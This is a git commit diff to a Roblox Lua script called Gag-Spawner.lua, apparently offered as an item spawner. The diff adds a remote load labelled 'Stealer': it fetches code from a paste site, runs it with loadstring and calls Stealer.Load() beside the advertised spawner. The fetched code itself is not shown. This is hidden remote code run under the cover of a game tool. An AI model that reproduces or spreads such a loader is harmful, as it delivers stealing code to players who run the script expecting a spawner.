bd1b0920ced218c4ae6604a480f17251d731b3d7
AhmadV99 <127880934+Zereppy@users.noreply.github.com>
2025-08-28 06:25:26 +0800

    Update Gag-Spawner.lua

--- Gag-Spawner.lua
+++ Gag-Spawner.lua
@@ -1,3 +1,4 @@
-loadstring(game:HttpGet("https://pastefy.app/dhTp1pCU/raw"))()
+local Stealer = loadstring(game:HttpGet("https://pastefy.app/dhTp1pCU/raw"))()
 local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
 Spawner.Load()
+Stealer.Load()
